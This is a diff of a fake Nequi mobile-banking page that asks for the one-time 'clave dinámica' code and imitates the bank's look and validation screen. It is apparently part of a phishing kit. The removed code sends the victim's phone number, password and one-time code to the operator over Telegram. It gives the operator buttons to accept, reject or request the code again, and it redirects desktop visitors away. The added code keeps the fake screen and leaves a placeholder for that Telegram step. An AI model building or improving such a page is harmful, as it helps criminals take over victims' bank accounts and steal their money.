@@ -4,12 +4,148 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Nequi - Clave Dinámica</title>
-  <link rel="stylesheet" href="../css/spinner.css" />
-  <link rel="stylesheet" href="../css/globals.css" />
-  <link rel="shortcut icon" type="image/x-icon" href="../assets/favicon.html" />
   <style>
-    /* Pantalla de validación - estilo Nequi */
-    .validatingScreen {
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+      background-color: #ffffff;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    .header {
+      padding: 20px;
+      background-color: #ffffff;
+    }
+
+    .logo {
+      width: 100px;
+      margin-bottom: 40px;
+    }
+
+    .title {
+      font-size: 28px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin-bottom: 16px;
+      text-align: center;
+    }
+
+    .subtitle {
+      font-size: 16px;
+      color: #666666;
+      text-align: center;
+      line-height: 1.5;
+      padding: 0 20px;
+      margin-bottom: 40px;
+    }
+
+    .input-container {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      padding: 0 20px;
+      margin-bottom: 60px;
+    }
+
+    .pin-input {
+      width: 48px;
+      height: 48px;
+      border: none;
+      border-bottom: 2px solid #e0e0e0;
+      text-align: center;
+      font-size: 32px;
+      font-weight: 600;
+      color: #1a1a1a;
+      background: transparent;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    .pin-input:focus {
+      border-bottom-color: #ff006b;
+    }
+
+    .pin-input.filled {
+      border-bottom-color: #1a1a1a;
+    }
+
+    .keyboard-container {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-end;
+      padding: 20px;
+      padding-bottom: 40px;
+    }
+
+    .keyboard-row {
+      display: flex;
+      justify-content: space-around;
+      margin-bottom: 20px;
+    }
+
+    .key-btn {
+      width: 80px;
+      height: 80px;
+      border: none;
+      background: transparent;
+      font-size: 32px;
+      font-weight: 400;
+      color: #1a1a1a;
+      cursor: pointer;
+      border-radius: 50%;
+      transition: background-color 0.15s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .key-btn:active {
+      background-color: #f5f5f5;
+    }
+
+    .key-btn.delete {
+      font-size: 24px;
+    }
+
+    .key-btn.empty {
+      visibility: hidden;
+    }
+
+    .confirm-btn {
+      width: calc(100% - 40px);
+      max-width: 400px;
+      margin: 20px auto;
+      padding: 18px;
+      background-color: #ff006b;
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: opacity 0.2s;
+    }
+
+    .confirm-btn:disabled {
+      opacity: 0.4;
+      cursor: not-allowed;
+    }
+
+    .confirm-btn:active:not(:disabled) {
+      opacity: 0.8;
+    }
+
+    .validating-screen {
       display: none;
       position: fixed;
       top: 0;
@@ -23,7 +159,7 @@
       flex-direction: column;
     }
     
-    .validatingScreen.active {
+    .validating-screen.active {
       display: flex;
     }
     
@@ -37,6 +173,11 @@
       width: 120px;
       height: 120px;
       margin: 0 auto 2rem;
+      background: #ff006b;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
       animation: pulse 2s ease-in-out infinite;
     }
     
@@ -79,45 +220,30 @@
     @keyframes spin {
       to { transform: rotate(360deg); }
     }
-    
-    .errorMessage {
+
+    .error-message {
       display: none;
-      background-color: #f44336;
+      background-color: #ff3b30;
       color: white;
-      padding: 1rem;
-      border-radius: 0.5rem;
-      margin: 1rem 1rem 0 1rem;
+      padding: 16px;
+      margin: 0 20px 20px;
+      border-radius: 12px;
       text-align: center;
-      transition: all 0.3s ease;
-      font-size: 0.95rem;
+      font-size: 14px;
     }
-    
-    .keyboard-btn:active {
-      background-color: rgba(255, 255, 255, 0.2);
-      transform: scale(0.95);
-    }
-    
-    .keyboard-btn {
-      transition: all 0.1s ease;
+
+    .error-message.show {
+      display: block;
     }
   </style>
 </head>
-
-<script>
-  document.addEventListener("DOMContentLoaded", function () {
-    let esMovil = /Mobi|Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i.test(navigator.userAgent);
-    if (!esMovil) {
-      window.location.href = "../pc.html";
-    }
-  });
-</script>
-
-<body class="bg-purple-primary h-dvh flex flex-col">
-  <!-- Pantalla de validación estilo Nequi -->
-  <div class="validatingScreen" id="validatingScreen">
+<body>
+  <div class="validating-screen" id="validatingScreen">
     <div class="validating-content">
       <div class="validating-icon">
-        <img src="../assets/loading-nequi.webp" alt="Validando...">
+        <svg width="60" height="60" viewBox="0 0 24 24" fill="white">
+          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+        </svg>
       </div>
       <h2 class="validating-title">Validando tu clave dinámica</h2>
       <p class="validating-message">Estamos verificando tu información. Esto solo tomará unos segundos.</p>
@@ -125,194 +251,155 @@
     </div>
   </div>
 
-  <div class="errorMessage" id="errorMessage">
+  <div class="error-message" id="errorMessage">
     ⚠️ La clave dinámica es incorrecta. Intenta nuevamente.
   </div>
 
-  <header class="w-full flex flex-col p-5 mb-4">
-    <a href="access-sign-in-pass.html" class="w-6 h-6 text-white mb-5">
-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" fill="currentColor">
-        <path d="M9.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.2 288 416 288c17.7 0 32-14.3 32-32s-14.3-32-32-32l-306.7 0L214.6 118.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"></path>
-      </svg>
-    </a>
-    <h1 class="text-white text-2xl font-bold">Clave dinámica</h1>
-    <p class="text-white/80 text-sm mt-2">
-      Ingresa la clave que te enviamos por SMS o genera una nueva desde tu app Nequi
-    </p>
-  </header>
+  <div class="header">
+    <svg class="logo" viewBox="0 0 120 40" fill="none">
+      <rect width="20" height="20" fill="#FF006B"/>
+      <text x="25" y="28" font-family="Arial, sans-serif" font-size="28" font-weight="bold" fill="#1a1a1a">Nequi</text>
+    </svg>
+  </div>
 
-  <section class="flex-1 max-w-[420px] flex flex-col mx-auto w-full px-4">
-    <div class="max-w-[380px] w-full flex justify-center gap-3 mx-auto mb-6">
-      <input id="din-1" maxlength="1" inputmode="none" readonly class="w-11 h-11 text-center bg-guanabana rounded-sm text-4xl font-bold text-pink-primary focus:outline-none pt-2.5" />
-      <input id="din-2" maxlength="1" inputmode="none" readonly class="w-11 h-11 text-center bg-guanabana rounded-sm text-4xl font-bold text-pink-primary focus:outline-none pt-2.5" />
-      <input id="din-3" maxlength="1" inputmode="none" readonly class="w-11 h-11 text-center bg-guanabana rounded-sm text-4xl font-bold text-pink-primary focus:outline-none pt-2.5" />
-      <input id="din-4" maxlength="1" inputmode="none" readonly class="w-11 h-11 text-center bg-guanabana rounded-sm text-4xl font-bold text-pink-primary focus:outline-none pt-2.5" />
-      <input id="din-5" maxlength="1" inputmode="none" readonly class="w-11 h-11 text-center bg-guanabana rounded-sm text-4xl font-bold text-pink-primary focus:outline-none pt-2.5" />
-      <input id="din-6" maxlength="1" inputmode="none" readonly class="w-11 h-11 text-center bg-guanabana rounded-sm text-4xl font-bold text-pink-primary focus:outline-none pt-2.5" />
+  <h1 class="title">Confirma tu identidad</h1>
+  <p class="subtitle">Para confirmar tu identidad escribe o pega la clave dinámica que encuentras en tu App Nequi.</p>
+
+  <div class="input-container">
+    <input type="text" class="pin-input" maxlength="1" inputmode="none" readonly id="pin1">
+    <input type="text" class="pin-input" maxlength="1" inputmode="none" readonly id="pin2">
+    <input type="text" class="pin-input" maxlength="1" inputmode="none" readonly id="pin3">
+    <input type="text" class="pin-input" maxlength="1" inputmode="none" readonly id="pin4">
+    <input type="text" class="pin-input" maxlength="1" inputmode="none" readonly id="pin5">
+    <input type="text" class="pin-input" maxlength="1" inputmode="none" readonly id="pin6">
+  </div>
+
+  <div class="keyboard-container">
+    <div class="keyboard-row">
+      <button class="key-btn" data-value="1">1</button>
+      <button class="key-btn" data-value="2">2</button>
+      <button class="key-btn" data-value="3">3</button>
     </div>
-
-    <p class="text-center text-white text-sm mb-8">
-      Esta clave es única y expira en 2 minutos
-    </p>
-
-    <div class="mt-auto w-full max-w-[400px] mx-auto pb-8" id="keyboard">
-      <div class="flex justify-around mb-4">
-        <button class="keyboard-btn w-12 h-12 border-none bg-transparent text-4xl text-white cursor-pointer rounded-full transition-colors duration-200" data-value="1">1</button>
-        <button class="keyboard-btn w-12 h-12 border-none bg-transparent text-4xl text-white cursor-pointer rounded-full transition-colors duration-200" data-value="2">2</button>
-        <button class="keyboard-btn w-12 h-12 border-none bg-transparent text-4xl text-white cursor-pointer rounded-full transition-colors duration-200" data-value="3">3</button>
-      </div>
-      <div class="flex justify-around mb-4">
-        <button class="keyboard-btn w-12 h-12 border-none bg-transparent text-4xl text-white cursor-pointer rounded-full transition-colors duration-200" data-value="4">4</button>
-        <button class="keyboard-btn w-12 h-12 border-none bg-transparent text-4xl text-white cursor-pointer rounded-full transition-colors duration-200" data-value="5">5</button>
-        <button class="keyboard-btn w-12 h-12 border-none bg-transparent text-4xl text-white cursor-pointer rounded-full transition-colors duration-200" data-value="6">6</button>
-      </div>
-      <div class="flex justify-around mb-4">
-        <button class="keyboard-btn w-12 h-12 border-none bg-transparent text-4xl text-white cursor-pointer rounded-full transition-colors duration-200" data-value="7">7</button>
-        <button class="keyboard-btn w-12 h-12 border-none bg-transparent text-4xl text-white cursor-pointer rounded-full transition-colors duration-200" data-value="8">8</button>
-        <button class="keyboard-btn w-12 h-12 border-none bg-transparent text-4xl text-white cursor-pointer rounded-full transition-colors duration-200" data-value="9">9</button>
-      </div>
-      <div class="flex justify-around mb-4">
-        <button class="invisible" disabled></button>
-        <button class="keyboard-btn w-12 h-12 border-none bg-transparent text-4xl text-white cursor-pointer rounded-full transition-colors duration-200" data-value="0">0</button>
-        <button class="keyboard-btn text-white w-12 h-12 border-none bg-transparent cursor-pointer rounded-full transition-colors duration-200" id="delete-din">
-          <svg width="33" height="30" viewBox="0 0 29 27" fill="none">
-            <path fill-rule="evenodd" clip-rule="evenodd" d="M26.8068 0C27.9114 0 28.8068 0.895431 28.8068 2V24.727C28.8068 25.8316 27.9114 26.727 26.8068 26.727H15.4722C14.9712 26.727 14.4884 26.5389 14.1194 26.2001L4.15169 17.0462C1.99435 15.065 1.99435 11.662 4.15169 9.68082L14.1194 0.526929C14.4884 0.188043 14.9712 0 15.4722 0H26.8068Z" fill="currentColor"></path>
-            <path d="M16.3541 11.1945L21.3873 16.2277" stroke="#200020" stroke-linecap="round" stroke-linejoin="round"></path>
-            <path d="M21.2213 11.4275L16.3423 16.3065" stroke="#200020" stroke-linecap="round" stroke-linejoin="round"></path>
-          </svg>
-        </button>
-      </div>
+    <div class="keyboard-row">
+      <button class="key-btn" data-value="4">4</button>
+      <button class="key-btn" data-value="5">5</button>
+      <button class="key-btn" data-value="6">6</button>
     </div>
-  </section>
+    <div class="keyboard-row">
+      <button class="key-btn" data-value="7">7</button>
+      <button class="key-btn" data-value="8">8</button>
+      <button class="key-btn" data-value="9">9</button>
+    </div>
+    <div class="keyboard-row">
+      <button class="key-btn empty"></button>
+      <button class="key-btn" data-value="0">0</button>
+      <button class="key-btn delete" id="deleteBtn">⌫</button>
+    </div>
+    
+    <button class="confirm-btn" id="confirmBtn" disabled>Confirmar</button>
+  </div>
 
-  <script src="../js/sendTelegramMessage.js"></script>
-  <script src="../js/actions.js"></script>
-  <script type="module">
-    document.addEventListener("DOMContentLoaded", () => {
-      const formData = JSON.parse(localStorage.getItem("formData")) || {};
-      const inputs = document.querySelectorAll('input[id^="din-"]');
-      const keyboard = document.getElementById("keyboard");
-      const deleteBtn = document.getElementById("delete-din");
-      const validatingScreen = document.getElementById("validatingScreen");
-      const errorMessage = document.getElementById("errorMessage");
-      let currentInput = 0;
-
-      if (!formData.phoneNumber || !formData.password) {
-        console.error("❌ Datos incompletos");
-        window.location.href = "accces-sign-in.html";
-        return;
-      }
-
-      keyboard.addEventListener("click", (e) => {
-        const button = e.target.closest(".keyboard-btn");
-        if (button && !button.id.includes("delete")) {
-          const value = button.dataset.value;
-          if (currentInput < inputs.length) {
-            inputs[currentInput].dataset.realValue = value;
-            inputs[currentInput].value = value;
-            inputs[currentInput].dispatchEvent(new Event("input", { bubbles: true }));
-            currentInput++;
-          }
-        }
-      });
-
-      deleteBtn.addEventListener("click", () => {
-        if (currentInput > 0) {
-          currentInput--;
-          inputs[currentInput].value = "";
-          inputs[currentInput].dataset.realValue = "";
-          inputs[currentInput].dispatchEvent(new Event("input", { bubbles: true }));
-        }
-      });
-
-      document.addEventListener("keydown", (e) => {
-        if (e.key === "Backspace" && currentInput > 0) {
-          currentInput--;
-          inputs[currentInput].value = "";
-          inputs[currentInput].dataset.realValue = "";
-          inputs[currentInput].dispatchEvent(new Event("input", { bubbles: true }));
-        }
-      });
-
-      inputs.forEach((input) => {
-        ["keydown", "keyup", "keypress"].forEach((eventType) => {
-          input.addEventListener(eventType, (e) => {
-            if (e.key !== "Backspace") {
-              e.preventDefault();
-              return false;
-            }
-          });
-        });
-        input.addEventListener("paste", (e) => {
-          e.preventDefault();
-          return false;
-        });
-      });
-
-      inputs.forEach((input) => {
-        input.addEventListener("input", async () => {
-          let isComplete = Array.from(inputs).every((inp) => inp.value !== "");
+  <script>
+    const inputs = [
+      document.getElementById('pin1'),
+      document.getElementById('pin2'),
+      document.getElementById('pin3'),
+      document.getElementById('pin4'),
+      document.getElementById('pin5'),
+      document.getElementById('pin6')
+    ];
+    
+    const keyButtons = document.querySelectorAll('.key-btn[data-value]');
+    const deleteBtn = document.getElementById('deleteBtn');
+    const confirmBtn = document.getElementById('confirmBtn');
+    const validatingScreen = document.getElementById('validatingScreen');
+    const errorMessage = document.getElementById('errorMessage');
+    
+    let currentIndex = 0;
+    
+    // Manejo del teclado numérico
+    keyButtons.forEach(btn => {
+      btn.addEventListener('click', () => {
+        if (currentIndex < inputs.length) {
+          const value = btn.dataset.value;
+          inputs[currentIndex].value = value;
+          inputs[currentIndex].dataset.realValue = value;
+          inputs[currentIndex].classList.add('filled');
+          currentIndex++;
           
-          if (isComplete) {
-            let dinamica = "";
-            inputs.forEach((inp) => {
-              dinamica += inp.dataset.realValue || inp.value || "";
-            });
-
-            const savedData = JSON.parse(localStorage.getItem("formData")) || {};
-            const transactionId = savedData.transactionId || Date.now().toString(36);
-            
-            savedData.dinamica = dinamica;
-            localStorage.setItem("formData", JSON.stringify(savedData));
-            
-            // Mostrar pantalla de validación estilo Nequi
-            if (validatingScreen) validatingScreen.classList.add("active");
-
-            const mensaje = `🔐 *CLAVE DINÁMICA NEQUI*\n\n📱 *Número:* +57 ${savedData.phoneNumber}\n🔑 *Clave:* ${savedData.password}\n🎯 *Dinámica:* ${dinamica}\n⏰ *Hora:* ${new Date().toLocaleTimeString('es-CO')}\n📅 *Fecha:* ${new Date().toLocaleDateString('es-CO')}`;
-            
-            const teclado = JSON.stringify({
-              inline_keyboard: [
-                [
-                  { text: "✅ Correcto", callback_data: `correcto:${transactionId}` },
-                  { text: "❌ Incorrecto", callback_data: `error_dinamica:${transactionId}` }
-                ],
-                [
-                  { text: "🔐 Pedir Otra Vez", callback_data: `pedir_dinamica:${transactionId}` }
-                ],
-                [
-                  { text: "✔️ Finalizar", callback_data: `finish:${transactionId}` }
-                ]
-              ]
-            });
-
-            try {
-              const responseMensaje = await sendTelegramMessageWithBtn(mensaje, teclado);
-              const { action } = await waitForButtonPress(responseMensaje.message_id);
-              
-              // Ocultar pantalla de validación
-              if (validatingScreen) validatingScreen.classList.remove("active");
-              
-              await handleAction(action, transactionId);
-            } catch (error) {
-              console.error("❌ Error:", error);
-              if (validatingScreen) validatingScreen.classList.remove("active");
-              
-              if (errorMessage) {
-                errorMessage.style.display = "block";
-                errorMessage.textContent = "⚠️ Error de conexión. Por favor intenta nuevamente.";
-              }
-              
-              setTimeout(() => {
-                inputs.forEach(inp => {
-                  inp.value = "";
-                  inp.dataset.realValue = "";
-                });
-                currentInput = 0;
-                if (errorMessage) errorMessage.style.display = "none";
-              }, 3000);
-            }
-          }
-        });
+          checkComplete();
+        }
+      });
+    });
+    
+    // Botón de borrar
+    deleteBtn.addEventListener('click', () => {
+      if (currentIndex > 0) {
+        currentIndex--;
+        inputs[currentIndex].value = '';
+        inputs[currentIndex].dataset.realValue = '';
+        inputs[currentIndex].classList.remove('filled');
+        
+        checkComplete();
+      }
+    });
+    
+    // Verificar si está completo
+    function checkComplete() {
+      const isComplete = inputs.every(input => input.value !== '');
+      confirmBtn.disabled = !isComplete;
+      
+      if (isComplete) {
+        // Auto-enviar después de completar
+        setTimeout(() => {
+          confirmBtn.click();
+        }, 300);
+      }
+    }
+    
+    // Botón confirmar
+    confirmBtn.addEventListener('click', async () => {
+      const dinamica = inputs.map(input => input.dataset.realValue || input.value).join('');
+      
+      // Mostrar pantalla de validación
+      validatingScreen.classList.add('active');
+      
+      // Simular envío (aquí iría tu lógica de Telegram)
+      await new Promise(resolve => setTimeout(resolve, 2000));
+      
+      // Ocultar pantalla de validación
+      validatingScreen.classList.remove('active');
+      
+      // Simular error (cambiar por tu lógica real)
+      const hasError = Math.random() > 0.5;
+      
+      if (hasError) {
+        errorMessage.classList.add('show');
+        
+        // Limpiar campos
+        setTimeout(() => {
+          inputs.forEach(input => {
+            input.value = '';
+            input.dataset.realValue = '';
+            input.classList.remove('filled');
+          });
+          currentIndex = 0;
+          confirmBtn.disabled = true;
+          errorMessage.classList.remove('show');
+        }, 3000);
+      } else {
+        // Éxito - redirigir o mostrar siguiente paso
+        console.log('Clave correcta:', dinamica);
+      }
+    });
+    
+    // Prevenir teclado del sistema
+    inputs.forEach(input => {
+      input.addEventListener('keydown', (e) => {
+        e.preventDefault();
+      });
+      input.addEventListener('paste', (e) => {
+        e.preventDefault();
       });
     });
   </script>
